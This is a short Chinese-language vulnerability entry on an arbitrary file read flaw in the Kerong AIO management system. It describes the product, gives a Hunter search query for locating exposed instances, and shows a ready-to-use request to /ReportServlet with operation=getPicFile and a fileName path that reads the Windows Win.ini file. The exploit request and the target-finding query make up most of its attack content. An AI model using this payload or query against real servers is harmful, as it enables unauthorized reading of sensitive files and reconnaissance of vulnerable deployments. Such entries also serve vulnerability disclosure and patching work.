# 科荣 AIO 管理系统 ReportServlet 存在任意文件读取漏洞

# 一、漏洞简介
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在任意文件读取漏洞，攻击者可以读取敏感文件。

# 二、影响版本
+ 科荣 AIO 管理系统 

# 三、资产测绘
+ hunter`app.name="科荣 AIO"`
+ 特征

![1699631783798-97153184-155c-4762-9c58-b7c8334bc638.png](./img/XvBttgxBfIbQVhAw/1699631783798-97153184-155c-4762-9c58-b7c8334bc638-362329.png)

# 四、漏洞复现
```plain
/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
```

![1703605110708-aaf15e4f-0d1d-42ac-b61e-58ee7433ad4e.png](./img/XvBttgxBfIbQVhAw/1703605110708-aaf15e4f-0d1d-42ac-b61e-58ee7433ad4e-041534.png)



> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yci7gf7f8ezqhzft>